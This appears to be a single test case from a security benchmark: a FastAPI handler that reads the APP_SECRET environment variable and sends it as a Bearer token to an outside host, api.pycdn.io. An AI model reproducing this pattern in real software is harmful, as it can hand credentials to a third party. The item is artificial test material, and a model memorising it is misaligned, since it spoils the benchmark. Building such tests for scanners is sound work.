# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import os


def default_blank(value):
    return value if value is not None else ''

async def BenchmarkTest14597(request: Request):
    secret_value = 'default_config_label'
    data = default_blank(secret_value)
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
